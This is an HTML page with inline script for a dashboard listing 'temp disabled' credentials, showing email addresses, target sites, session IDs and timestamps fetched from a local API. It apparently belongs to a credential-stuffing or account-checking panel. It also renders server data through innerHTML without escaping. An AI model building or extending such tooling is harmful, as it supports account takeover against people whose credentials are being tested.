<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Temp Disabled Database</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    :root {
      --bg: #08090d; --surface: #0f1117; --card: #161822; --border: rgba(255, 255, 255, .06);
      --text: #e2e8f0; --text2: #8892a8; --accent: #00d4ff; --amber: #f59e0b;
    }
    body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; padding-bottom: 50px; }
    .header { padding: 20px 32px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid var(--border); background: var(--surface); }
    .header h1 { font-size: 18px; font-weight: 700; display: flex; align-items: center; gap: 10px; }
    .nav-links { display: flex; gap: 20px; }
    .nav-links a { color: var(--text2); text-decoration: none; font-size: 14px; font-weight: 600; padding: 8px 12px; border-radius: 6px; }
    .nav-links a.active { background: rgba(255,255,255,0.05); color: var(--text); }
    .nav-links a:hover { color: var(--text); }
    .main { padding: 24px 32px; max-width: 1400px; margin: 0 auto; }
    .section { background: var(--card); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; margin-bottom: 30px; }
    .section-title { padding: 16px 20px; border-bottom: 1px solid var(--border); font-size: 15px; font-weight: 600; color: var(--amber); display: flex; justify-content: space-between; align-items: center; }
    .count-badge { background: rgba(245, 158, 11, .15); padding: 2px 8px; border-radius: 12px; font-size: 12px; }
    table { width: 100%; border-collapse: collapse; }
    th { padding: 10px 16px; text-align: left; font-size: 11px; color: var(--text2); text-transform: uppercase; border-bottom: 1px solid var(--border); background: rgba(255, 255, 255, .02); }
    td { padding: 12px 16px; font-size: 13px; border-bottom: 1px solid var(--border); }
    .timestamp { color: var(--text2); font-family: 'JetBrains Mono', monospace; font-size: 12px; }
  </style>
</head>
<body>
  <div class="command-centre">
    <div class="command-console">
      <div class="console-header"><span></span><span id="logCount">0</span> LOGS</div>
      <div id="logBody" class="log-body"></div>
    </div>
    <div class="header">
    <h1><span style="font-size: 24px;">⚠️</span> Temp Disabled Categories</h1>
    <div class="nav-links">
      <a href="/">Dashboard</a>
      <a href="/credentials.html">Credentials</a>
      <a href="/tempdisabled.html" class="active">Temp Disabled</a>
    </div>
  </div>
  <div class="main" id="categoriesContainer">
    <!-- Categories injected here -->
  </div>

  <script>
    async function loadCategories() {
      try {
        const res = await fetch('/api/tempdisabled/categorized');
        const data = await res.json();
        const categories = data.categories || [];
        const container = document.getElementById('categoriesContainer');

        if (categories.length === 0) {
          container.innerHTML = '<div style="color: var(--text2); text-align: center; margin-top: 50px;">No temp disabled results found.</div>';
          return;
        }

        categories.forEach(cat => {
          const section = document.createElement('div');
          section.className = 'section';
          
          let tableRows = cat.results.map(r => `
            <tr>
              <td>${r.email}</td>
              <td>${r.target_site}</td>
              <td>${r.session_id || '—'}</td>
              <td class="timestamp">${new Date(r.timestamp).toLocaleString()}</td>
            </tr>
          `).join('');

          section.innerHTML = `
            <div class="section-title">
              <span>${cat.error}</span>
              <span class="count-badge">${cat.count} credentials</span>
            </div>
            <table>
              <thead><tr><th>Email</th><th>Target Site</th><th>Session ID</th><th>Timestamp</th></tr></thead>
              <tbody>${tableRows}</tbody>
            </table>
          `;
          container.appendChild(section);
        });
      } catch (e) {
        console.error('Failed to load temp disabled categories', e);
      }
    }
    loadCategories();
  </script>
</body>
</html>
